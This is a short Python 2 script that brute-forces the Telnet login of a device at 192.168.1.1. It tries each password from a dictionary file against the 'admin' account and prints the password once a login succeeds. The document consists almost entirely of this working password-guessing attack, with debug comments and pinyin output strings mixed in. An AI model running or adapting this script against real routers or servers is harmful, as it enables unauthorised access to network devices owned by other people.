# -*- coding: utf-8 -*-
from telnetlib import Telnet
Host='192.168.1.1'
username = 'admin'
f=open('passdic1.txt', 'r')
for line in f:
    passwd = line
    # print passwd
    tn=Telnet(Host, port=23)
    tn.read_until("Username:")
    tn.write(username + '\n')
    try:
        tn.read_until('Password:')
        tn.write(passwd)
        fanhui=tn.read_until('!')
        # print '11111\n'

        # print fanhui
        if 'failed' in fanhui:
            print '%shibai'
        else:
            print 'mi ma shi'+passwd
            break
    except:
        print '1111111111111111'
        continue
    tn.close()
    # print tn.read_eager()
    # tn.write('admin'+"\n")
    # print '22222_1222222222222222222___________________________'
    # print 'fffff'
